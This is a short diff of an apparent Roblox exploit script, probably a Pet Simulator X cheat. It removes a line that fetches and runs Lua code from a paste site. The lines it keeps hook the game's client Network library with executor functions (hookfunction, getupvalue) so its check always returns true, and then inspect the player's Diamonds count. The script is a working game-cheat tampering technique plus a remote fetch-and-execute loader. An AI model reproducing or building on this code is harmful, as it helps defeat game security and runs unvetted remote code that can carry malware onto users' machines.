@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/69420.lua"))()
-
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
 if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
